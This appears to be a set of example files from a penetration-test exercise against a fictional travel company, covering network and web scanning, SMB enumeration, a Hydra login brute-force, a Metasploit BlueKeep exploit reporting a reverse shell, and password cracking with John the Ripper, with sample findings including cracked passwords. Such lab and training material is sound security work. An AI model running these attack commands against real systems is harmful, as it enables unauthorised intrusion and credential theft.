# Nmap Scan Example – Internal IP Range

nmap -sS -sV 10.10.20.0/24

Findings:

•	Port 80 open on 10.10.20.14 (Apache 2.4.29)
•	Port 3389 open on 10.10.20.21 (RDP Service)

---

### `theharvester-example.md`
# theHarvester – Email and Subdomain Enumeration

theHarvester -d tripplanner.local -b bing

Findings:

•	Emails: it.admin@tripplanner.local, booking.support@tripplanner.local
•	Subdomains: staging.tripplanner.local, beta.tripplanner.local

---

### `shodan-example.md`
# Shodan Search – Public Exposure Check

shodan search "TripPlanner"

---

###`shodan-example.md`

# Shodan Search – Public Exposure Check

shodan search "TripPlanner"


Findings:

•	1 RDP service exposed publicly (port 3389)
•	2 devices with default credentials flag


---

### `nikto-example.md`

# Nikto – Web Vulnerability Scan

nikto -h http://staging.tripplanner.local

Findings:
•	Outdated Apache version
•	PHP info disclosure at /phpinfo.php
•	Admin login page without SSL

---

### `gobuster-example.md`

# Gobuster – Hidden Directory Scan

gobuster dir -u http://intranet.tripplanner.local -w /usr/share/wordlists/dirb/common.txt


Findings:
•	/admin/
•	/upload/
•	/dev/

---

### `enum4linux-example.md`

# Enum4Linux – SMB Share Enumeration

enum4linux -a 10.10.20.45


Findings:
•	Share: \HRShared accessible without credentials
•	User list dump: jdoe, mjames, sadmin
•	Password policy: weak, no lockout

---

### `hydra-login-test.md`

# Hydra – Login Brute Force Test

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.20.14 http-post-form "/admin:username=^USER^&password=^PASS^:Invalid login"


Findings:
•	Password found for admin: summer2021

---

### 📄 `metasploit-session.md`

# Metasploit – Exploiting RDP Vulnerability

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.20.21
run

Findings:
•	Exploit succeeded
•	Reverse shell obtained
•	Privilege escalation possible

---

### `john-password-crack.md`

# John the Ripper – Cracking Password Hashes

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt


Findings:
•	Cracked: admin:sunshine123
•	Cracked: jdoe:qwerty2022

---

### `dradis-report.md`

# Dradis – Report Collaboration

Uploaded all findings to Dradis for central documentation:

- Port scans  
- Screenshot uploads  
- CVE references  
- PDF report generated for CISO review


